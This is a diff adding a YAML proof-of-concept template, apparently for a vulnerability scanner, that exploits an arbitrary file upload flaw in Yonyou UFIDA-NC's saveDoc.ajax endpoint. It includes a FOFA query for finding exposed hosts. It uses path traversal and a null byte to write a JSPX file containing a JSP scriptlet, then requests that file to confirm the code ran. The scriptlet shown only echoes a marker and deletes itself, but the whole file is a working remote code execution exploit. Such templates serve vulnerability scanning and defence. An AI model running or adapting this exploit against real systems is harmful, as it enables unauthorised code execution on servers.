@@ -1,0 +1,26 @@
+id: poc-yaml-yonyou-ufida-nc-savedoc-ajax-arbitrary-file-upload
+info:
+  name: 用友ufida-NC saveDoc.ajax 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: ufida-nc
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /uapws/saveDoc.ajax?ws=/../../{{.t1}}.jspx%00
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: "content=<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n      <hi:directive.page\
+    \ import=\"java.util.*,java.io.*,java.net.*\"/>\n   <hi:scriptlet>\n         \
+    \   out.println(\"{{.t2}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();\n\
+    \   </hi:scriptlet>\n</hi>"
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /uapws/{{.t1}}.jspx
+  expression: status_code == 200 && contains(body,t2) && contains(headers,"text/xml")
+transport: http
